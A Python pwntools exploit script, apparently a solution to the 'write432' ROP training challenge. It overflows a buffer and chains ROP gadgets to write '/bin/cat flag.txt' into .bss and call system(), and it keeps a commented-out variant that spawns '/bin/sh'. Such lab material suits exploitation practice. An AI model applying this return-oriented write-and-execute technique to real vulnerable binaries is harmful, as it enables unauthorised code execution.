from pwn import *

# extend arr to be divisible by n (extend using ch
def extend(arr, n, ch):
	diff = 4 - (len(arr) % 4)
	arr.extend([ch] * diff)
	return arr

# convert string to integer in little endian in groups of 4 bytes
def string2int(st):
	def change(ch): return hex(ord(ch))[2:]
	arr = list(map(change, list(st)))
	arr = extend(arr, 4, '00')

	res = []
	for i in range(0, len(arr), 4):
		res.append(arr[i:i+4])

	for i in range(len(res)):
		each = res[i]
		each.reverse()
		fin = ''.join(each)
		res[i] = int(fin, 16)
	
	return res

e = ELF('./write432')
p = e.process()

print(p.recv().decode())

# raw_input('attach gdb')

# padding for buffer overflow
padding = b'A' * 44

# address to write arbitrary string (stack)
# writing to .bss section of ELF
base = 0x804a0d0

# string to write
st = "/bin/cat flag.txt"

# solution 2 -> spawn shell using system('/bin/sh')
# st = "/bin/sh"

# st in hex
hexs = string2int(st)

# `pop edi; pop ebp; ret` gadget
pop = p32(0x080486da)

# `mov dword ptr [edi], ebp ; ret` gadget
mov = p32(0x08048670)

# address of call to system
syst = p32(0x0804865a)

# payload is initialised with padding
payload = padding

mem = base
for n in hexs:
	payload += pop
	payload += p32(mem)
	payload += p32(n)
	payload += mov

	# increment mem to next address
	mem += 4

payload += syst

# address where string is written is provided as argument to system call
payload += p32(base)

p.sendline(payload)

flag = p.recv().decode()
success(flag)

# solution 2
# p.interactive()